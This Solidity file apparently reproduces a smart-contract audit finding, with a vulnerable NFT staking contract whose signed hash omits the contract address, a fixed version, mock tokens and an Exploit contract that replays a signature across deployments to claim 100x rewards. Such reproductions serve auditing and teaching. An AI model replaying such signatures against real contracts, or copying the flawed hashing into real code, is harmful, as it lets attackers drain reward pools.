// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of HYBUX finding 63684 (Pashov):
// "Cross-contract signature replay allows users to inflate rewards".
//
// NFTStaking._stakeNFTs verifies a trusted-signer authorization whose digest is
//
//     bytes32 hash = keccak256(abi.encode(_sender, _tokenIds, _rarityWeightIndexes));
//
// The hash omits `address(this)`, so an authorization signed for ONE NFTStaking
// deployment (e.g. WORLDS_STAKING, where token #100 is genuinely legendary,
// weight 100) is a valid signature on a SECOND deployment (e.g. GRAYBOYS_STAKING,
// where token #100 is common, weight 1) that shares the same signer. An attacker
// who owns the same token id in both collections obtains the legendary signature
// for deployment A, then REPLAYS the identical signature bytes on deployment B
// while staking the common NFT — crediting the common (weight-1) NFT with the
// legendary (weight-100) reward multiplier and claiming ~100x the rewards a
// common NFT is entitled to.
//
// Only the vulnerable hash line is embedded verbatim in the finding; the rest of
// _stakeNFTs (ECDSA verification against the trusted signer + a rarity-weight ->
// reward accrual) is a faithful reconstruction around it. The signer key is held
// legitimately (see §5.4 of the SKILL): the exploit REPLAYS a genuinely-valid
// signature across the domain gap — it does not forge crypto.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double for the HYBUX reward token (REWARD-HYBUX). The
///      reward pool is held by each NFTStaking contract and paid out on claim.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Minimal faithful ERC721 double for an NFT collection. The NFT transfer is
///      not the vulnerable boundary; a standard-shaped ERC721 double is faithful.
contract MockERC721 {
    string public name;
    string public symbol;
    mapping(uint256 => address) public ownerOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 tokenId) external {
        ownerOf[tokenId] = to;
    }

    function setApprovalForAll(address operator, bool approved) external {
        isApprovedForAll[msg.sender][operator] = approved;
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "not owner");
        require(from == msg.sender || isApprovedForAll[from][msg.sender], "not approved");
        ownerOf[tokenId] = to;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract: the signed digest omits address(this), so a signature is
// replayable across deployments that share a signer. Verbatim buggy hash inlined.
// ─────────────────────────────────────────────────────────────────────────────
contract NFTStaking {
    address public signer; // trusted rarity-attesting signer, SHARED across deployments
    MockERC721 public nftCollection; // the NFT collection bound to THIS deployment
    MiniToken public rewardToken; // REWARD-HYBUX pool held by this contract
    uint256[] public rarityWeights; // index -> weight, e.g. [common 1, rare 5, epic 20, legendary 100]

    uint256 public constant REWARD_PER_WEIGHT = 1000 ether; // reward accrued per weight unit

    mapping(uint256 => uint256) public stakedWeight; // tokenId -> recorded rarity weight
    mapping(uint256 => address) public stakerOf; // tokenId -> credited staker

    constructor(address _signer, address _nft, address _reward, uint256[] memory _weights) {
        signer = _signer;
        nftCollection = MockERC721(_nft);
        rewardToken = MiniToken(_reward);
        rarityWeights = _weights;
    }

    function stakeNFTs(
        address _sender,
        uint256[] memory _tokenIds,
        uint256[] memory _rarityWeightIndexes,
        bytes memory _signature
    ) external {
        _stakeNFTs(_sender, _tokenIds, _rarityWeightIndexes, _signature);
    }

    function _stakeNFTs(
        address _sender,
        uint256[] memory _tokenIds,
        uint256[] memory _rarityWeightIndexes,
        bytes memory _signature
    ) internal {
        bytes32 hash = keccak256(abi.encode(_sender, _tokenIds, _rarityWeightIndexes)); // @> signature hash omits address(this): an authorization signed for one NFTStaking deployment is replayable on another sharing the signer
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        require(_recover(digest, _signature) == signer, "invalid signature");

        for (uint256 i = 0; i < _tokenIds.length; i++) {
            nftCollection.transferFrom(msg.sender, address(this), _tokenIds[i]);
            stakedWeight[_tokenIds[i]] = rarityWeights[_rarityWeightIndexes[i]];
            stakerOf[_tokenIds[i]] = _sender;
        }
    }

    function pendingRewards(uint256 tokenId) public view returns (uint256) {
        return stakedWeight[tokenId] * REWARD_PER_WEIGHT;
    }

    /// @notice Pay out accrued rewards to the credited staker (permissionless poke).
    function claim(uint256 tokenId) external returns (uint256) {
        address staker = stakerOf[tokenId];
        require(staker != address(0), "not staked");
        uint256 amount = pendingRewards(tokenId);
        stakedWeight[tokenId] = 0;
        rewardToken.transfer(staker, amount);
        return amount;
    }

    function _recover(bytes32 digest, bytes memory signature) internal pure returns (address) {
        require(signature.length == 65, "bad sig");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(digest, v, r, s);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: the digest binds address(this), so a signature authorized for
// deployment A no longer validates on deployment B — the replay is rejected.
// ─────────────────────────────────────────────────────────────────────────────
contract NFTStakingFixed {
    address public signer;
    MockERC721 public nftCollection;
    MiniToken public rewardToken;
    uint256[] public rarityWeights;

    uint256 public constant REWARD_PER_WEIGHT = 1000 ether;

    mapping(uint256 => uint256) public stakedWeight;
    mapping(uint256 => address) public stakerOf;

    constructor(address _signer, address _nft, address _reward, uint256[] memory _weights) {
        signer = _signer;
        nftCollection = MockERC721(_nft);
        rewardToken = MiniToken(_reward);
        rarityWeights = _weights;
    }

    function stakeNFTs(
        address _sender,
        uint256[] memory _tokenIds,
        uint256[] memory _rarityWeightIndexes,
        bytes memory _signature
    ) external {
        _stakeNFTs(_sender, _tokenIds, _rarityWeightIndexes, _signature);
    }

    function _stakeNFTs(
        address _sender,
        uint256[] memory _tokenIds,
        uint256[] memory _rarityWeightIndexes,
        bytes memory _signature
    ) internal {
        // FIX: bind the deployment address into the signed digest (domain separation).
        bytes32 hash = keccak256(abi.encode(_sender, _tokenIds, _rarityWeightIndexes, address(this)));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        require(_recover(digest, _signature) == signer, "invalid signature");

        for (uint256 i = 0; i < _tokenIds.length; i++) {
            nftCollection.transferFrom(msg.sender, address(this), _tokenIds[i]);
            stakedWeight[_tokenIds[i]] = rarityWeights[_rarityWeightIndexes[i]];
            stakerOf[_tokenIds[i]] = _sender;
        }
    }

    function pendingRewards(uint256 tokenId) public view returns (uint256) {
        return stakedWeight[tokenId] * REWARD_PER_WEIGHT;
    }

    function claim(uint256 tokenId) external returns (uint256) {
        address staker = stakerOf[tokenId];
        require(staker != address(0), "not staked");
        uint256 amount = pendingRewards(tokenId);
        stakedWeight[tokenId] = 0;
        rewardToken.transfer(staker, amount);
        return amount;
    }

    function _recover(bytes32 digest, bytes memory signature) internal pure returns (address) {
        require(signature.length == 65, "bad sig");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(digest, v, r, s);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: two NFTStaking deployments (A=WORLDS, B=GRAYBOYS) share one
// trusted signer. The attacker owns token #100 in both collections. A legendary
// authorization signed for the WORLDS token is replayed verbatim onto GRAYBOYS,
// crediting the common GRAYBOYS #100 with legendary weight and claiming 100x the
// rewards. The inflated REWARD-HYBUX is left at the attacker EOA.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // Trusted signer = address for private key 0x…01 (held legitimately, §5.4).
    address internal constant SIGNER = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf;

    uint256 internal constant TOKEN_ID = 100;
    uint256 internal constant LEGENDARY_INDEX = 3; // rarityWeights[3] = 100
    uint256 internal constant COMMON_INDEX = 0; // rarityWeights[0] = 1

    // Precomputed offline (cast, key = 0x…01):
    //   inner  = keccak256(abi.encode(ATTACKER, [100], [3]))
    //   digest = keccak256("\x19Ethereum Signed Message:\n32" || inner)
    //   (r,s,v) = sign(digest) with the signer key (--no-hash)
    // The digest omits address(this) — that is exactly why the SAME bytes validate
    // on BOTH deployments. Signed for _sender=ATTACKER, tokenIds=[100], idx=[3].
    bytes32 internal constant SIG_R = 0xed8d9a96a7e7f60ff33aca7d88337f4c16bb4a14b1c170dd33b9d27dad8fcfd9;
    bytes32 internal constant SIG_S = 0x16c0db92239927210b8718363ee5caf6fa8595ec0d82980f46473a9dd2bcb98e;
    uint8 internal constant SIG_V = 27;

    // Deployed doubles / vulnerable contracts.
    MiniToken public reward; // REWARD-HYBUX
    MockERC721 public worlds; // collection A (attacker's #100 is legendary)
    MockERC721 public grayboys; // collection B (attacker's #100 is common)
    NFTStaking public stakingA; // WORLDS_STAKING
    NFTStaking public stakingB; // GRAYBOYS_STAKING — replay target

    // Exposed results for the driver's harm assertions.
    uint256 public recordedWeightOnB; // weight credited to the COMMON grayboys #100
    uint256 public honestCommonWeight; // the weight a common NFT should carry (1)
    uint256 public inflatedReward; // REWARD-HYBUX the attacker claimed on B
    uint256 public honestBaseline; // REWARD-HYBUX a common NFT would earn
    uint256 public attackerReward; // REWARD-HYBUX balance at the attacker EOA
    address public rewardAddr;
    address public stakingBAddr;

    constructor() {
        uint256[] memory weights = new uint256[](4);
        weights[0] = 1; // common
        weights[1] = 5; // rare
        weights[2] = 20; // epic
        weights[3] = 100; // legendary

        reward = new MiniToken("HYBUX Reward", "REWARD-HYBUX"); // nonce 1
        worlds = new MockERC721("Worlds", "WRLD"); // nonce 2
        grayboys = new MockERC721("Grayboys", "GRAY"); // nonce 3
        stakingA = new NFTStaking(SIGNER, address(worlds), address(reward), weights); // nonce 4  (WORLDS_STAKING)
        stakingB = new NFTStaking(SIGNER, address(grayboys), address(reward), weights); // nonce 5 (GRAYBOYS_STAKING)

        rewardAddr = address(reward);
        stakingBAddr = address(stakingB);

        // Attacker owns token #100 in BOTH collections; the Exploit acts as the
        // attacker's staking agent (owns + approves the NFTs on-chain).
        worlds.mint(address(this), TOKEN_ID);
        grayboys.mint(address(this), TOKEN_ID);
        worlds.setApprovalForAll(address(stakingA), true);
        grayboys.setApprovalForAll(address(stakingB), true);

        // Fund each deployment's reward pool.
        reward.mint(address(stakingA), 1_000_000 ether);
        reward.mint(address(stakingB), 1_000_000 ether);
    }

    function run() external payable {
        bytes memory sig = abi.encodePacked(SIG_R, SIG_S, SIG_V);

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = TOKEN_ID;
        uint256[] memory legendaryIdx = new uint256[](1);
        legendaryIdx[0] = LEGENDARY_INDEX;

        // (1) LEGITIMATE: stake the genuinely-legendary WORLDS #100 on deployment A.
        stakingA.stakeNFTs(ATTACKER, tokenIds, legendaryIdx, sig);
        require(stakingA.stakedWeight(TOKEN_ID) == 100, "A: legendary weight");

        // (2) REPLAY: the SAME signature bytes validate on deployment B (hash omits
        //     address(this)). Stake the COMMON grayboys #100 as if it were legendary.
        stakingB.stakeNFTs(ATTACKER, tokenIds, legendaryIdx, sig);

        recordedWeightOnB = stakingB.stakedWeight(TOKEN_ID); // 100 (legendary) — should be 1
        honestCommonWeight = grayboysHonestWeight(); // 1 (common)

        // (3) Claim on B: pays the credited staker (ATTACKER) 100x a common NFT's reward.
        inflatedReward = stakingB.claim(TOKEN_ID);
        honestBaseline = honestCommonWeight * stakingB.REWARD_PER_WEIGHT();
        attackerReward = reward.balanceOf(ATTACKER);

        // HARM: a common (weight-1) NFT was credited legendary (weight-100) and paid
        // 100x — i.e. 99x more than the weight-1 baseline it is entitled to.
        require(recordedWeightOnB == 100, "B not credited legendary");
        require(honestCommonWeight == 1, "grayboys #100 is common");
        require(inflatedReward == 100 * honestBaseline, "reward not inflated 100x");
        require(attackerReward == inflatedReward, "attacker did not receive inflated reward");
    }

    /// @dev The true rarity weight the GRAYBOYS #100 (a common NFT) should carry.
    function grayboysHonestWeight() internal view returns (uint256) {
        return stakingB.rarityWeights(COMMON_INDEX);
    }
}
